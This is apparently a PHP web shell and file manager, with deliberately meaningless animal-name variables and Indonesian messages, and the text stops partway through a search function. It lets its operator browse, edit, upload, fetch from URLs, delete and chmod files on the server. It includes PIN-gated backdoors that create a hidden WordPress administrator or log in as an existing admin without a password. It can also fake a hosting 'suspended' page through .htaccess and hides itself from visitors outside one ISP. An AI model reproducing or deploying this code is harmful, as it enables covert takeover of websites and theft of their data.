<?php
ob_start();
session_start();
if (empty($_SESSION['logged_in'])) {
    header("Location: /../../default.php");
    exit;
}


require_once __DIR__ . '/../../add.php'; 

$singa2  = __DIR__ . '/../../config/.env';
$harimau2  = read_env($singa2);
$gajah = isset($harimau2['META_HIDE_MODE']) ? $harimau2['META_HIDE_MODE'] : '0';
$kelinci  = isset($harimau2['META_HIDE_ISP'])  ? $harimau2['META_HIDE_ISP']  : '';

if (!function_exists('ws_get_isp_name')) {
    function ws_get_isp_name($monyet3) {
        $monyet3 = trim((string)$monyet3);
        if ($monyet3 === '' || $monyet3 === '127.0.0.1' || $monyet3 === '::1') {
            return '';
        }

        $kerbau1 = stream_context_create(array(
            'http' => array(
                'timeout'       => 5,
                'ignore_errors' => true,
                'header'        => "User-Agent: HideMode/1.0\r\nAccept: application/json\r\n",
            ),
        ));

        
        $koala8  = 'http://ip-api.com/json/' . rawurlencode($monyet3) . '?fields=isp';
        $itik3 = @file_get_contents($koala8, false, $kerbau1);
        if ($itik3 !== false) {
            $simpanse1 = @json_decode($itik3, true);
            if (is_array($simpanse1) && !empty($simpanse1['isp'])) {
                return (string)$simpanse1['isp'];
            }
        }

        
        $sapi8  = 'https://ipinfo.io/' . rawurlencode($monyet3) . '/json';
        $ikan3 = @file_get_contents($sapi8, false, $kerbau1);
        if ($ikan3 !== false) {
            $orangutan1 = @json_decode($ikan3, true);
            if (is_array($orangutan1) && !empty($orangutan1['org'])) {
                return (string)$orangutan1['org'];
            }
        }

        return '';
    }
}

if (!function_exists('ws_write_env_updates')) {
    
    function ws_write_env_updates($gajah2, $macan8) {
        if (!is_array($macan8)) return false;
        if (!function_exists('read_env')) return false;

        $bison1 = file_exists($gajah2) ? read_env($gajah2) : array();
        foreach ($macan8 as $hiu3 => $kerbau8) {
            $bison1[$hiu3] = $kerbau8;
        }

        $kecoak3 = array();
        foreach ($bison1 as $hiu3 => $kerbau8) {
            $kerbau8 = str_replace(array("\r", "\n"), ' ', (string)$kerbau8);
            if (preg_match('/\s/', $kerbau8)) {
                
                $kerbau8 = '"' . str_replace('"', '\"', $kerbau8) . '"';
            }
            $kecoak3[] = $hiu3 . '=' . $kerbau8;
        }

        return file_put_contents($gajah2, implode("\n", $kecoak3) . "\n") !== false;
    }
}


$monyet6 = $_SERVER['DOCUMENT_ROOT'];
$gorila6 = DIRECTORY_SEPARATOR;


$orangutan8 = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
    . '://' . $_SERVER['HTTP_HOST'];
    
    
    $lebah5 = 'https://siakad.fakultaskesehatan.com';
    $bison = '$2y$12$Y3uueDZXQmy5tPyxELHPJuNj4/7c0p.EFHbbQHKX2U/41zRXKsONm';


$macan3 = rtrim($orangutan8, '/') . '/';
if ($gajah === '1' && $kelinci !== '') {
    
    $anjing1 = ws_get_client_ip();
    $rubah1  = ws_get_isp_name($anjing1);

    if ($rubah1 === '' || stripos($rubah1, $kelinci) === false) {
        header("Location: " . $macan3);
        exit;
    }
}


function sanitizePath($gorila5) {
    $gorila5 = str_replace(['../', './', '..\\', '.\\'], '', $gorila5);
    $gorila5 = str_replace(chr(0), '', $gorila5);
    return $gorila5;
}
function getFileEmoji($itik2) {
    $musang2 = strtolower(pathinfo($itik2, PATHINFO_EXTENSION));
    switch($musang2) {
        case 'php': return '🛠️';
        case 'txt': return '📄';
        case 'css': return '🎨';
        case 'js': return '📜';
        case 'html': return '🌐';
        case 'json': return '🧾';
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼️';
        case 'zip': return '📚';
        case 'rar': return '📦';
        case 'pdf': return '📕';
        default: return '⚙️';
    }
}



function getDirectLink($lebah2) {
    global $orangutan8;
    $belut5 = realpath($lebah2);
    if (!$belut5) {
        return '#';
    }

    $macan6 = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $belut5));
    $macan6 = '/' . ltrim($macan6, '/');

    if (is_dir($belut5) && substr($macan6, -1) !== '/') {
        $macan6 .= '/';
    }

    return rtrim($orangutan8, '/') . $macan6;
}


function zipFolder($buaya2, $ikan8) {
    $angsa8 = new ZipArchive();
    if ($angsa8->open($ikan8, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $buaya2 = realpath($buaya2);
        $ikan2 = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($buaya2),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($ikan2 as $monyet2) {
            if (!$monyet2->isDir()) {
                $merpati2 = $monyet2->getRealPath();
                $beruang6 = substr($merpati2, strlen($buaya2) + 1);
                $angsa8->addFile($merpati2, $beruang6);
            }
        }
        $angsa8->close();
        return true;
    }
    return false;
}


if (isset($_GET['download'])) {
    $semut1 = sanitizePath($_GET['download']);
    if (is_file($semut1)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($semut1).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($semut1));
        readfile($semut1);
        exit;
    } elseif (is_dir($semut1)) {
        $itik8 = tempnam(sys_get_temp_dir(), 'zip');
        zipFolder($semut1, $itik8);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.basename($semut1).'.zip"');
        header('Content-Length: ' . filesize($itik8));
        readfile($itik8);
        unlink($itik8);
        exit;
    }
}


if (isset($_GET['download_deploy_result'])) {
    
    $sessionKey = 'deploy_file_result_txt';

    $namaFile = isset($_SESSION[$sessionKey]) ? $_SESSION[$sessionKey] : '';
    if ($namaFile) {
        $namaFile = basename($namaFile); 
        $baseDir  = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/.well-known/acme-challenge/result/';
        $fullPath = $baseDir . $namaFile;

        if (is_file($fullPath)) {
            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="' . $namaFile . '"');
            header('Content-Length: ' . filesize($fullPath));
            readfile($fullPath);
            @unlink($fullPath);
            unset($_SESSION[$sessionKey]);
            exit;
        }
    }

    header("HTTP/1.0 404 Not Found");
    echo "Result file not found.";
    exit;
}


if (isset($_POST['create_admin_user'])) {
    $pin = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';
    if ($pin === '' || empty($bison) || !password_verify($pin, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $newUser = isset($_POST['admin_new_user']) ? trim($_POST['admin_new_user']) : '';
    $newPass = isset($_POST['admin_new_pass']) ? (string)$_POST['admin_new_pass'] : '';
    $newEmail = isset($_POST['admin_new_email']) ? trim($_POST['admin_new_email']) : '';

    if ($newUser === '' || $newPass === '') {
        $_SESSION['admin_create_status'] = 'Username dan password admin baru wajib diisi.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $root = $_SERVER['DOCUMENT_ROOT'];
    @chdir($root);

    if (!file_exists('wp-load.php')) {
        $_SESSION['admin_create_status'] = 'wp-load.php tidak ditemukan di Document Root.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    include_once 'wp-load.php';

    if (!function_exists('username_exists') || !function_exists('wp_create_user')) {
        $_SESSION['admin_create_status'] = 'Fungsi WordPress untuk membuat user tidak tersedia.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    if (username_exists($newUser)) {
        $_SESSION['admin_create_status'] = 'Username sudah terdaftar. Gunakan username lain.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $emailFinal = $newEmail !== '' ? $newEmail : ($newUser . '@' . $_SERVER['HTTP_HOST']);

    $uid = wp_create_user($newUser, $newPass, $emailFinal);
    if (!$uid || is_wp_error($uid)) {
        $msg = 'Gagal membuat user admin baru.';
        if (is_wp_error($uid)) {
            $msg .= ' ' . $uid->get_error_message();
        }
        $_SESSION['admin_create_status'] = $msg;
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $wpUser = new WP_User($uid);
    if ($wpUser && !is_wp_error($wpUser)) {
        $wpUser->set_role('administrator');
    }

    $_SESSION['admin_create_status'] = 'Berhasil membuat user admin baru: ' . $newUser . ' (password: ' . $newPass . ').';
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['auto_admin_login'])) {
    $tupai3 = isset($_POST['admin_pin']) ? trim($_POST['admin_pin']) : '';

    
    if ($tupai3 === '' || empty($bison) || !password_verify($tupai3, $bison)) {
        $_SESSION['admin_pin_error'] = 'PIN admin salah atau kosong.';
        header("Location: " . $_SERVER['REQUEST_URI']);
        exit;
    }

    $merpati4 = $_SERVER['DOCUMENT_ROOT'];
    @chdir($merpati4);

    if (file_exists('wp-load.php')) {
        include 'wp-load.php';

        if (class_exists('WP_User_Query')) {
            $merpati8 = new WP_User_Query([
                'role'   => 'Administrator',
                'number' => 1,
                'fields' => 'ID',
            ]);

            $kerbau6 = $merpati8->get_results();

            if (isset($kerbau6[0])) {
                wp_set_auth_cookie($kerbau6[0]);
                wp_redirect(admin_url());
                exit;
            }

            die('NO ADMIN');
        }

        die('WP_User_Query tidak tersedia.');
    }

    die('wp-load.php tidak ditemukan di Document Root.');
}


if (isset($_GET['view'])) {
    $gorila8 = sanitizePath($_GET['view']);
    if (is_file($gorila8) && is_readable($gorila8)) {
        $singa1 = @file_get_contents($gorila8);
        $burung2 = basename($gorila8);
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>View File: <?= htmlspecialchars($burung2) ?></title>
            <style>
                body { background: #f5f5f5; font-family: Arial; color:#222; }
                .view-box { margin: 32px auto; max-width: 700px; background: #fff; border-radius: 8px; padding: 24px 24px 18px 24px; box-shadow: 0 2px 12px #ff0000; }
                h2 { font-size: 18px; margin-bottom: 12px;}
                pre { background: #272822; color: #eee; padding: 12px; border-radius: 6px; font-size:13px; overflow-x:auto;}
                a { color: #2980b9; text-decoration: none; font-size: 14px;}
                a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="view-box">
                <a href="javascript:history.back()">⬅️ Kembali</a>
                <h2>View File: <?= htmlspecialchars($burung2) ?></h2>
                <pre><?= htmlspecialchars($singa1) ?></pre>
            </div>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "<div class='alert error'>File tidak bisa dibuka atau tidak ditemukan.</div>";
        exit;
    }
}


if (!isset($_SESSION['dir_history']) || !is_array($_SESSION['dir_history'])) {
    $_SESSION['dir_history'] = [$monyet6];
}
if (isset($_GET['folder'])) {
    $bison1 = sanitizePath($_GET['folder']);
    $kodok3 = end($_SESSION['dir_history']);
    if ($kodok3 !== $bison1) {
        $_SESSION['dir_history'][] = $bison1;
        if (count($_SESSION['dir_history']) > 20) array_shift($_SESSION['dir_history']);
    }
}
if (isset($_GET['back_dir'])) {
    if (count($_SESSION['dir_history']) > 1) {
        array_pop($_SESSION['dir_history']);
        $ayam = end($_SESSION['dir_history']);
        header("Location: ?folder=" . urlencode($ayam));
        exit;
    }
}


function getPermissionColor($lebah2) {
    if (!file_exists($lebah2)) return 'danger';
    if (!is_readable($lebah2) && !is_writable($lebah2)) {
        return 'danger';
    } elseif (!is_writable($lebah2)) {
        return 'warning';
    } else {
        return 'success';
    }
}


function deleteRecursive($gorila5) {
    if (!file_exists($gorila5)) return true;
    @chmod($gorila5, 0777);
    if (is_file($gorila5) || is_link($gorila5)) {
        return @unlink($gorila5);
    }
    if (is_dir($gorila5)) {
        $bebek3 = array_diff(scandir($gorila5), ['.','..']);
        foreach ($bebek3 as $ayam3) {
            if (!deleteRecursive($gorila5 . '/' . $ayam3)) return false;
        }
        return @rmdir($gorila5);
    }
    return false;
}


if (isset($_GET['ajax_delete']) && isset($_POST['target'])) {
    $simpanse7 = sanitizePath($_POST['target']);
    $kura2 = isset($_GET['folder']) ? sanitizePath($_GET['folder']) : $_SERVER['DOCUMENT_ROOT'];
    $kupu2 = $kura2 . '/' . $simpanse7;
    $monyet7 = deleteRecursive($kupu2);
    header('Content-Type: application/json');
    echo json_encode(['success' => $monyet7]);
    exit;
}

function toggleSuspendHtaccess($kucing2, $rusa2 = []) {
    $kambing3 = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
    $itik = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess.old.bak';

    if ($kucing2) {
        
        if (file_exists($kambing3)) {
            if (!is_writable($kambing3)) {
                @chmod($kambing3, 0777); 
            }

            
            if (!file_exists($itik)) {
                $gajah5 = @file_get_contents($kambing3);
                if ($gajah5 !== false) {
                    @file_put_contents($itik, $gajah5);
                }
            }

            
            @unlink($kambing3);
        }

        
        $kecoak3 = [];
        $kecoak3[] = "RewriteEngine On";

        foreach ($rusa2 as $gorila5) {
            $gorila5 = trim($gorila5);
            if ($gorila5 !== '') {
                
                if ($gorila5[0] !== '/') $gorila5 = '/' . $gorila5;

                
                if (substr($gorila5, -1) === '/') {
                    $domba2 = addcslashes(rtrim($gorila5, '/'), '.^$[](){}+|');
                    $kecoak3[] = "RewriteCond %{REQUEST_URI} !^" . $domba2 . "/";
                } else {
                    $domba2 = addcslashes($gorila5, '.^$[](){}+|');
                    $kecoak3[] = "RewriteCond %{REQUEST_URI} !^" . $domba2 . "$";
                }
            }
        }

        
        $kecoak3[] = "RewriteCond %{REQUEST_URI} !^/cgi-sys/suspendedpage\\.cgi$";
        $kecoak3[] = "RewriteRule ^.*$ /cgi-sys/suspendedpage.cgi [R=302,L]";

        return file_put_contents($kambing3, implode("\n", $kecoak3)) !== false;

    } else {
        
        if (file_exists($kambing3)) {
            @unlink($kambing3);
        }
        if (file_exists($itik)) {
            return @rename($itik, $kambing3);
        }
        return true;
    }
}


$bebek2 = null;
$gorila2 = null;
$buaya1 = isset($_GET['folder']) ? $_GET['folder'] : $monyet6;
$buaya1 = sanitizePath($buaya1);
$buaya1 = is_dir($buaya1) ? $buaya1 : $monyet6;
$monyet = @scandir($buaya1) ?: [];
$monyet = array_diff($monyet, array('..', '.'));
$ular2 = []; $ikan2 = [];
foreach ($monyet as $ayam3) {
    if (is_dir($buaya1 . '/' . $ayam3)) $ular2[] = $ayam3;
    else $ikan2[] = $ayam3;
}
sort($ular2); sort($ikan2); 
$hiu2 = array_merge($ular2, $ikan2);

$elang5 = 40;
$rusa5 = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$katak7 = count($hiu2);
$biawak7 = max(1, ceil($katak7 / $elang5));
$hiu2 = array_slice($hiu2, ($rusa5 - 1) * $elang5, $elang5);


if (isset($_POST['deleteSelected']) && !empty($_POST['selectedItems'])) {
    foreach ($_POST['selectedItems'] as $semut6) {
        $orangutan5 = $buaya1 . '/' . sanitizePath($semut6);
        deleteRecursive($orangutan5);
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}


if (isset($_POST['zipSelected']) && !empty($_POST['selectedItems'])) {
    $hiu8 = "multi_" . date('Ymd_His') . ".zip";
    $paus8 = $buaya1 . '/' . $hiu8;
    $angsa8 = new ZipArchive();
    if ($angsa8->open($paus8, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($_POST['selectedItems'] as $semut6) {
            $capung2 = $buaya1 . '/' . sanitizePath($semut6);
            if (is_dir($capung2)) {
                
                $ikan2 = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($capung2, FilesystemIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($ikan2 as $monyet2) {
                    $merpati2 = $monyet2->getRealPath();
                    $beruang6 = $semut6 . '/' . substr($merpati2, strlen($capung2) + 1);
                    $angsa8->addFile($merpati2, $beruang6);
                }
            } elseif (is_file($capung2)) {
                $angsa8->addFile($capung2, $semut6);
            }
        }
        $angsa8->close();
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}


if (isset($_POST['chmodSelected']) && !empty($_POST['selectedItems']) && !empty($_POST['chmodSelectedValue'])) {
    $kecoak = intval($_POST['chmodSelectedValue'], 8);
    foreach ($_POST['selectedItems'] as $semut6) {
        $simpanse5 = $buaya1 . '/' . sanitizePath($semut6);
        @chmod($simpanse5, $kecoak);
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}

if (isset($_POST['createFile'])) {
    $ular4 = $buaya1 . '/' . sanitizePath($_POST['fileName']);
    if (!file_exists($ular4)) {
        touch($ular4);
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>File sudah ada!</div>";
    }
}
if (isset($_POST['createFolder'])) {
    $kadal4 = $buaya1 . '/' . sanitizePath($_POST['folderName']);
    if (!is_dir($kadal4)) {
        mkdir($kadal4, 0777, true);
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Folder sudah ada!</div>";
    }
}
if (isset($_POST['upload'])) {
    if (isset($_FILES['fileToUpload']) && isset($_FILES['fileToUpload']['name'])) {
        $kodok7 = count($_FILES['fileToUpload']['name']);
        $sapi2 = [];
        for ($bison3 = 0; $bison3 < $kodok7; $bison3++) {
            $burung2 = $_FILES['fileToUpload']['name'][$bison3];
            $ayam2 = $_FILES['fileToUpload']['tmp_name'][$bison3];
            $simpanse2 = $_FILES['fileToUpload']['error'][$bison3];
            if ($simpanse2 != 0) {
                $sapi2[] = "Gagal upload file $burung2 (Error code: $simpanse2)";
                continue;
            }
            $gorila4 = 15 * 1024 * 1024; 
            $gorila = ['jpg','jpeg','png','gif','txt','pdf','zip','rar', 'php', 'html', 'phtml', 'htaccess', 'env', 'webp'];
            $musang2 = strtolower(pathinfo($burung2, PATHINFO_EXTENSION));
            if (!in_array($musang2, $gorila)) {
                $sapi2[] = "Ekstensi file $burung2 tidak diizinkan";
                continue;
            }
            if ($_FILES['fileToUpload']['size'][$bison3] > $gorila4) {
                $sapi2[] = "File $burung2 terlalu besar (maksimal 5MB)";
                continue;
            }
            $burung7 = $buaya1 . '/' . basename(sanitizePath($burung2));
            if (move_uploaded_file($ayam2, $burung7)) {
                
            } else {
                $sapi2[] = "Gagal upload file $burung2";
            }
        }
        if (empty($sapi2)) {
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        } else {
            echo "<div class='alert error'>" . implode('<br>', $sapi2) . "</div>";
        }
    }
}

if (isset($_POST['downloadFromUrl'])) {
    $panda8 = trim($_POST['fileUrl']);
    $tupai1 = trim($_POST['fileUrlName']);

    if (!filter_var($panda8, FILTER_VALIDATE_URL) || !preg_match('#^https?://#i', $panda8)) {
        echo "<div class='alert error'>URL tidak valid!</div>";
    } else {
        $lumba  = basename(parse_url($panda8, PHP_URL_PATH) ?: '');
        $itik2  = $tupai1 !== '' ? sanitizePath($tupai1) : sanitizePath($lumba);
        if ($itik2 === '') $itik2 = 'downloaded_file';
        
        $itik2 = preg_replace('~[\\\\/]+~', '', $itik2);

        $burung7 = rtrim($buaya1, '/').'/'.$itik2;

        if (file_exists($burung7)) {
            echo "<div class='alert error'>File sudah ada di folder ini!</div>";
        } else {
            $cacing4 = false; $beruang2 = '';

            
            if (function_exists('curl_init')) {
                $katak2 = @fopen($burung7, 'wb');
                if ($katak2 === false) {
                    $beruang2 = 'Tidak bisa membuat file tujuan (permission?).';
                } else {
                    $lebah = curl_init($panda8);
                    curl_setopt_array($lebah, [
                        CURLOPT_FILE            => $katak2,
                        CURLOPT_FOLLOWLOCATION  => true,
                        CURLOPT_MAXREDIRS       => 5,
                        CURLOPT_CONNECTTIMEOUT  => 10,
                        CURLOPT_TIMEOUT         => 30,
                        CURLOPT_USERAGENT       => 'Mozilla/5.0 (FileManager/1.0)',
                        CURLOPT_SSL_VERIFYPEER  => true,
                        CURLOPT_SSL_VERIFYHOST  => 2,
                        CURLOPT_FAILONERROR     => true, 
                    ]);
                    $bison2 = curl_exec($lebah);
                    $kuda3   = (int) curl_getinfo($lebah, CURLINFO_HTTP_CODE);
                    if (!$bison2) $beruang2 = 'cURL: '.curl_error($lebah);
                    curl_close($lebah);
                    fclose($katak2);

                    if ($bison2 && $kuda3 >= 200 && $kuda3 < 300) {
                        $cacing4 = true;
                    } else {
                        @unlink($burung7);
                        if (!$beruang2) $beruang2 = "HTTP status $kuda3";
                    }
                }
            }

            
            if (!$cacing4 && ini_get('allow_url_fopen')) {
                $beruang5 = [
                    'http' => [
                        'timeout'       => 15,
                        'ignore_errors' => true,
                        'header'        => "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n",
                    ],
                    'ssl'  => [
                        'verify_peer'      => true,
                        'verify_peer_name' => true,
                        
                    ],
                ];
                $koala1 = stream_context_create($beruang5);
                $gorila1    = @file_get_contents($panda8, false, $koala1);
                if ($gorila1 !== false) {
                    if (@file_put_contents($burung7, $gorila1) !== false) {
                        $cacing4 = true;
                    } else {
                        $beruang2 = 'Gagal menyimpan file di server.';
                    }
                } else {
                    global $http_response_header;
                    if (!empty($http_response_header[0])) {
                        $beruang2 = $http_response_header[0]; 
                    } else {
                        $beruang2 = 'file_get_contents gagal (periksa allow_url_fopen / SSL).';
                    }
                }
            }

            if ($cacing4) {
                echo "<div class='alert success'>File berhasil diunduh ke: <b>".htmlspecialchars($itik2)."</b></div>";
                header("Refresh: 1; URL=".$_SERVER['REQUEST_URI']);
                exit;
            } else {
                echo "<div class='alert error'>Gagal mendownload file. $beruang2</div>";
            }
        }
    }
}

if (isset($_POST['rename'])) {
    $harimau5 = $buaya1 . '/' . sanitizePath($_POST['oldName']);
    $kodok4 = $buaya1 . '/' . sanitizePath($_POST['newName']);
    if (file_exists($kodok4)) {
        echo "<div class='alert error'>File atau folder dengan nama ini sudah ada.</div>";
    } else {
        if (@rename($harimau5, $kodok4)) {
            header("Location: " . $_SERVER['REQUEST_URI']); exit;
        } else {
            echo "<div class='alert error'>Gagal mengubah nama.</div>";
        }
    }
}

if (isset($_POST['suspendOn']) || isset($_POST['suspendOff'])) {
    $kucing2 = isset($_POST['suspendOn']);
    $rusa2 = [];

    foreach (['except1', 'except2', 'except3'] as $paus3) {
        if (!empty($_POST[$paus3])) {
            
            $cacing = preg_replace('/[^a-zA-Z0-9\/\._-]/', '', trim($_POST[$paus3]));
            $rusa2[] = $cacing;
        }
    }

    if (toggleSuspendHtaccess($kucing2, $rusa2)) {
        $_SESSION['suspend_status'] = $kucing2 ? 'on' : 'off';
        $_SESSION['suspend_message'] = $kucing2 ? 'Suspend AKTIF.' : 'Suspend DINONAKTIFKAN.';
    } else {
        $_SESSION['suspend_status'] = 'error';
        $_SESSION['suspend_message'] = 'Gagal mengubah .htaccess. Periksa permission file!';
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['hideModeOn']) || isset($_POST['hideModeOff'])) {
    $simpanse8 = isset($_POST['hideModeOn']);

    if ($simpanse8) {
        
        $anjing1 = ws_get_client_ip();
        $burung3 = ws_get_isp_name($anjing1);

        if ($burung3 === '') {
            $_SESSION['hide_mode_status']  = 'error';
            $_SESSION['hide_mode_message'] = 'Gagal mendeteksi ISP. Coba lagi atau cek koneksi server ke internet.';
        } else {
            if (ws_write_env_updates($singa2, array(
                'META_HIDE_MODE' => '1',
                'META_HIDE_ISP'  => $burung3,
            ))) {
                $_SESSION['hide_mode_status']  = 'on';
                $_SESSION['hide_mode_message'] = 'Hide mode AKTIF. ISP yang diizinkan: ' . $burung3;
                $gajah   = '1';
                $kelinci = $burung3;
            } else {
                $_SESSION['hide_mode_status']  = 'error';
                $_SESSION['hide_mode_message'] = 'Gagal menyimpan pengaturan hide mode.';
            }
        }
    } else {
        if (ws_write_env_updates($singa2, array(
            'META_HIDE_MODE' => '0',
        ))) {
            $_SESSION['hide_mode_status']  = 'off';
            $_SESSION['hide_mode_message'] = 'Hide mode DIMATIKAN.';
            $gajah = '0';
        } else {
            $_SESSION['hide_mode_status']  = 'error';
            $_SESSION['hide_mode_message'] = 'Gagal menyimpan pengaturan hide mode ke file .env.';
        }
    }

    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

if (isset($_POST['chmod'])) {
    $hiu4 = $buaya1 . '/' . sanitizePath($_POST['nameToChmod']);
    $bebek5 = intval($_POST['perm'], 8);
    if (@chmod($hiu4, $bebek5)) {
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal mengubah permission.</div>";
    }
}
if (isset($_POST['delete'])) {
    $paus4 = $buaya1 . '/' . sanitizePath($_POST['nameToDelete']);
    if (deleteRecursive($paus4)) {
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal menghapus file/folder. Cek permission/ownership!</div>";
    }
}
if (isset($_POST['edit'])) {
    $bebek2 = sanitizePath($_POST['fileNameToEdit']);
    $gorila2 = @file_get_contents($buaya1 . '/' . $bebek2);
}
if (isset($_POST['saveEdit'])) {
    $elang2 = sanitizePath($_POST['fileNameToEdit']);
    $buaya4 = $_POST['content'];
    $merpati2 = $buaya1 . '/' . $elang2;
    if (empty($buaya4)) {
        echo "<div class='alert error'>Konten file tidak boleh kosong!</div>";
    } else if (file_exists($merpati2)) {
        if (@file_put_contents($merpati2, $buaya4) !== false) {
            header("Location: " . $_SERVER['REQUEST_URI']); exit;
        } else {
            echo "<div class='alert error'>Gagal menyimpan perubahan.</div>";
        }
    } else {
        echo "<div class='alert error'>File tidak ditemukan.</div>";
    }
}

if (isset($_POST['zip'])) {
    $ayam3 = sanitizePath($_POST['itemToZip']);
    $gorila5 = $buaya1 . '/' . $ayam3;
    $hiu8 = $ayam3 . '_' . date('Ymd_His') . '.zip';
    $paus8 = $buaya1 . '/' . $hiu8;
    if (is_dir($gorila5)) {
        zipFolder($gorila5, $paus8);
    } elseif (is_file($gorila5)) {
        $angsa8 = new ZipArchive();
        if ($angsa8->open($paus8, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
            $angsa8->addFile($gorila5, basename($gorila5));
            $angsa8->close();
        }
    }
    header("Location: " . $_SERVER['REQUEST_URI']); exit;
}

if (isset($_POST['extractZip'])) {
    $itik8 = $buaya1 . '/' . sanitizePath($_POST['zipToExtract']);
    $angsa1 = sanitizePath($_POST['extractDest']);
    if (!is_dir($angsa1)) mkdir($angsa1, 0777, true);
    $angsa8 = new ZipArchive();
    if ($angsa8->open($itik8) === TRUE) {
        $angsa8->extractTo($angsa1);
        $angsa8->close();
        header("Location: " . $_SERVER['REQUEST_URI']); exit;
    } else {
        echo "<div class='alert error'>Gagal extract ZIP!</div>";
    }
}


function fm_search_scan($tupai6, $itik4, $macan1, &$kerbau6, &$kambing7, &$sapi2) {
    $kerbau6 = [];
    $sapi2  = [];
    $kambing7   = [
        'dirs'           => 0,
        'files'          => 0,
        'nameMatches'    => 0,
        'contentMatches' => 0,
        'stoppedByLimit' => false,
    ];

    $tupai6      = rtrim($tupai6, DIRECTORY_SEPARATOR);
    $itik4  = trim((string)$itik4);
    $macan1 = trim((string)$macan1);

    if ($itik4 === '' && $macan1 === '') {
        $sapi2[] = 'Isi minimal salah satu: cari nama file/folder atau cari isi file.';
        return false;
    }

    if (!is_dir($tupai6)) {
        $sapi2[] = 'Root search bukan folder yang valid: ' . $tupai6;
        return false;
    }
    if (!is_readable($tupai6)) {
        $sapi2[] = 'Folder root tidak bisa dibaca (permission): ' . $tupai6;
        return false;
    }

    @set_time_limit(180);
    @ignore_user_abort(true);

    $kerbau4      = 4000;      
    $monyet4   = 600;       
    $serigala4  = 1024*1024; 
    $belut6 = [
        'php','php3','php4','php5','php7','php8','phtml',
        'inc','html','htm','txt','js','css','env','ini','conf','log'
    ];

    $lumba2 = FilesystemIterator::SKIP_DOTS;
    $elang3    = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($tupai6, $lumba2),
        RecursiveIteratorIterator::SELF_FIRST,
        RecursiveIteratorIterator::CATCH_GET_CHILD
    );

    $capung1 = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);

    foreach ($elang3 as $musang3) {
        
        $gorila5 = $musang3->getPathname();

        
        if ($musang3->isDir()) {
            $kambing7['dirs']++;

            
            if ($itik4 !== '' && stripos($musang3->getFilename(), $itik4) !== false) {
                $kucing6 = str_replace($capung1, '', $gorila5);
                if ($kucing6 === '') $kucing6 = $gorila5;

                $kerbau6[] = [
                    'type' => 'name',
                    'kind' => 'dir',
                    'path' => $kucing6,
                    'full' => $gorila5,
                ];
                $kambing7['nameMatches']++;
            }

            if ($kambing7['dirs'] > $kerbau4) {
                $kambing7['stoppedByLimit'] = true;
                $sapi2[] = "Scan dihentikan otomatis setelah melewati {$kerbau4} folder.\n" .
                            "Kemungkinan kamu memulai dari root yang terlalu jauh (misalnya langsung Document Root).\n" .
                            "Saran: masuk dulu ke folder yang lebih spesifik (misalnya langsung ke folder theme atau plugin) baru jalankan search.";
                break;
            }

            continue;
        }

        
        if (!$musang3->isFile()) {
            continue;
        }
        $kambing7['files']++;

        $angsa4     = $musang3->getFilename();
        $lebah2 = $gorila5;
        $kucing6      = str_replace($capung1, '', $lebah2);
        if ($kucing6 === '') $kucing6 = $lebah2;

        
        if ($itik4 !== '' && stripos($angsa4, $itik4) !== false) {
            $kerbau6[] = [
                'type' => 'name',
                'kind' => 'file',
                'path' => $kucing6,
                'full' => $lebah2,
            ];
            $kambing7['nameMatches']++;
        }

        
        if ($macan1 !== '') {
            $musang2 = strtolower(pathinfo($angsa4, PATHINFO_EXTENSION));
            if (!in_array($musang2, $belut6, true)) {
                
            } else {
                $kucing7 = $musang3->getSize();
                if ($kucing7 !== false && $kucing7 <= $serigala4 && @is_readable($lebah2)) {
                    $kecoak3 = @file($lebah2, FILE_IGNORE_NEW_LINES);
                    if ($kecoak3 !== false) {
                        $domba4 = [];
